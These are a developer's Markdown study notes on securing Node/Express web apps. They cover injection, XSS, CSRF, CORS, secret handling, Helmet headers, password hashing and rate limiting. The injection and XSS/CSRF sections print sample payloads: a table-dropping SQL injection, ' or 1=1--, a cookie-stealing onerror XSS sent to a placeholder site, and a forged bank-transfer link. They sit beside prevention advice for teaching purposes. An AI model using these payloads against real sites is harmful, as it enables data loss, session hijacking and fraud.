# Security

- [Security](#security)
- [Star Of Security](#star-of-security)
  - [Injections](#injections)
    - [Injecting code into SQL Database](#injecting-code-into-sql-database)
    - [Inject into .InnerHtml](#inject-into-innerhtml)
    - [Prevention](#prevention)
  - [3rd Party Libraries](#3rd-party-libraries)
    - [NSP - ***DEPRECATED***](#nsp---deprecated)
    - [SNYK](#snyk)
  - [Logging](#logging)
    - [Winston](#winston)
    - [Morgan](#morgan)
  - [HTTPS Everywhere](#https-everywhere)
    - [Lets Encrypt](#lets-encrypt)
    - [Cloudflare](#cloudflare)
  - [XSS & CSRF](#xss--csrf)
    - [Cross Site Scripting](#cross-site-scripting)
    - [Cross Site Request Forgery](#cross-site-request-forgery)
    - [Prevention](#prevention-1)
      - [Security Policy In Headers](#security-policy-in-headers)
      - [Cookies](#cookies)
  - [CORS](#cors)
  - [Code Secrets](#code-secrets)
    - [Environmental Variables](#environmental-variables)
    - [Git Commit History](#git-commit-history)
  - [Secure Headers](#secure-headers)
  - [Access Control](#access-control)
    - [Principle of Least Privilege](#principle-of-least-privilege)
    - [Prevention](#prevention-2)
  - [Data Management](#data-management)
    - [Backups](#backups)
    - [Encrypt Data](#encrypt-data)
    - [Password Hashing / Storage](#password-hashing--storage)
      - [Bcrypt](#bcrypt)
      - [Scrypt](#scrypt)
      - [Argon2](#argon2)
    - [Database Encryption](#database-encryption)
      - [pgCrypto](#pgcrypto)
  - [Authentication](#authentication)
  - [Rate Limiting](#rate-limiting)
  - [Don't Trust Anything / Anyone](#dont-trust-anything--anyone)

# Star Of Security

## Injections

  ***https://www.hacksplaining.com/exercises/sql-injection***

### Injecting code into SQL Database
  ```sql
  #SQL Injection

  # Drops table from the database
  INSERT INTO users (column) VALUES (''; DROP TABLE users; --);

  ' or 1=1--
  ```

### Inject into .InnerHtml

  *images are injected into the DOM at the time of encountering the `<img>` tag*
  ```html
  <img src='/' onerror="alert('hack');">
  ```

### Prevention

- Sanitize Input
- Parametrize Queries
- Use `Knex.js` or other `ORMS`

  `knex.select('param1', 'param2').from('table)'`

  *HTML PRACTICES*
  ```javascript
  const p = document.getElementbyId("IdName");

  // BAD PRACTICE
  p.innerHTML = input;

  // GOOD PRACTICE - INPUT SANITIZATION
  var textNode = document.createTextNode(input);
  p.appendChild(textNode);
  ```

## 3rd Party Libraries

- Check github page stars and community
- Use packages that are well known, well respected, and constantly worked on

### NSP - ***DEPRECATED***

  `npm i -g nsp`

  `nsp check # audit package.json`

### SNYK

  `npm i -g snyk`

  `snyk test # audit node_modules directory`

## Logging

  *Gathering information from system*

  ### Winston

  *logger for almost everything*
  *replacement for `console.log()`*

  `npm i -D winston`

  `winston.log('<option>', <input>);`

  `winston.error('Error!');`


  ### Morgan

  *Http request logger for node*

  `npm i -D morgan`

  `app.use(morgan('<log option>')):`

  ```javascript
  // DEVELOPMENT LOGGING
  if (process.env.NODE_ENV === 'development') {
  app.use(morgan('dev'));
  }
  ```

## HTTPS Everywhere

*SSL/TLS Certificates*

### Lets Encrypt

***https://letsencrypt.org/***

### Cloudflare

***Cloudflare helps protect against DDOS attacks***

***https://www.cloudflare.com***

## XSS & CSRF

  *Cross site scripting - cross sight request forgery*

  https://www.hacksplaining.com/exercises/xss-stored

  https://www.hacksplaining.com/exercises/csrf

  ### Cross Site Scripting

- Allows attacker to execute scripts in victims browser

    ```html
    <!-- EXAMPLE -->
    <!-- Session hijacking - send user to specific website and steal cookies -->
    <img src='/' onerror="window.location = '<site>.com?cookie=' + document.cookie">
    ```

  ### Cross Site Request Forgery

  *creates a bad url with bad code in it*

  ```html

  <!-- Use Query Parameters Using HTTP GET -->

  <a href="http://netbank.com/transfer.do?acct=AttackerA&amount;=$100">Read More!</a>

  ```

  ### Prevention

  - use ***Csurf***

    `npm i csurf`

  - Sanitize Input
  - Never Use
    - `eval()`
    - `document.write(<script>);`

  #### Security Policy In Headers

  - Set security policy in headers with Express
    ```javascript
    res.set({
      'Content-Security-Policy': "script-src 'self' 'https://apis.google.com'"
    });
    ```

  #### Cookies

  - Avoid using cookies
  - If using cookies - set the cookie security policy

    ```javascript
    res.cookie('session', '1', {httpOnly: true})
    res.cookie('session', '1', {secure: true})
    ```

## CORS

*Cross Origin Resource Sharing*

`npm i cors`

`app.use(cors());`

## Code Secrets

  ***Hide important information***

  - Api Keys
  - Database Passwords
  - Development Environment Variables

  ### Environmental Variables

  - Install `dotenv` from npm
  - Create `.env` file

    - In React
      ```conf
      REACT_APP_SECRET=<SECRET>
      ```

    - Standard Usage
      ```conf
      DB_SECRET=<SECRET>
      ```
  ### Git Commit History

  - Never commit anything secret to Github
  - If an accidental commit is sent - secret passwords/codes **MUST** be changed

  - Commits can be checked in the past on github
    - EXP: Searching 'remove password' in commits of a rep

## Secure Headers

  - Use the `Helmet` NPM package
  - Secures express apps by settings various HTTP headers

    `npm i helmet`

    `app.use(helmet());`

  | Module                                                        | Default? |
  | ------------------------------------------------------------- | -------- |
  | contentSecurityPolicy for setting Content Security Policy     |          |
  | crossdomain for handling Adobe products' crossdomain requests |          |
  | dnsPrefetchControl controls browser DNS prefetching           | ✓        |
  | expectCt for handling Certificate Transparency                |          |
  | featurePolicy to limit your site's features                   |          |
  | frameguard to prevent clickjacking                            | ✓        |
  | hidePoweredBy to remove the X-Powered-By header               | ✓        |
  | hsts for HTTP Strict Transport Security                       | ✓        |
  | ieNoOpen sets X-Download-Options for IE8+                     | ✓        |
  | noSniff to keep clients from sniffing the MIME type           | ✓        |
  | referrerPolicy to hide the Referer header                     |          |
  | xssFilter adds some small XSS protections                     | ✓        |

## Access Control

### Principle of Least Privilege

***Restrictions on authenticated user actions and access***

- Only give users the bare minimum of what they need to complete work

### Prevention

  - Use `cors` NPM package
  - Restrict `cors` access with whitelists

    ```javascript
    var whitelist = ['http://example1.com', 'http://example2.com']

    var corsOptions = {
      origin: function (origin, callback) {
        if (whitelist.indexOf(origin) !== -1) {
          callback(null, true)
        } else {
          callback(new Error('Not allowed by CORS'))
        }
      }
    }

    app.use(cors(corseOptions));

    ```

## Data Management

### Backups

- Always have backups

- Never have one point of failure

### Encrypt Data

- Encrypt Data in Transition

- Encrypt sensitive information (passwords, emails, etc)

### Password Hashing / Storage

https://rangle.io/blog/how-to-store-user-passwords-and-overcome-security-threats-in-2017/

#### Bcrypt

`npm i bcrypt`

https://www.npmjs.com/package/bcrypt

https://www.npmjs.com/package/bcryptjs

#### Scrypt

`npm i scrypt`

https://www.npmjs.com/package/scrypt

https://www.npmjs.com/package/bcryptjs

#### Argon2

`npm i argon2`

https://www.npmjs.com/package/argon2

### Database Encryption

#### pgCrypto

  - Encrypt Database Columns

## Authentication

- ***Ensure user is who they say the are***

- ***Manage sessions correctly for the users***

- ***View Authentication Markdown Document***

## Rate Limiting

- Install rate limiting packages

```javascript
// *RATE LIMITER
const limiter = rateLimit({
  max: 100,
  windowMs: 60 * 60 * 1000,
  message: 'Too many requests from this IP, please try again in an hour.'
});

// ADD RATE LIMITER TO THE API ROUTE
app.use('/api', limiter);
```

## Don't Trust Anything / Anyone

***Every point in the connection chain can be compromised***

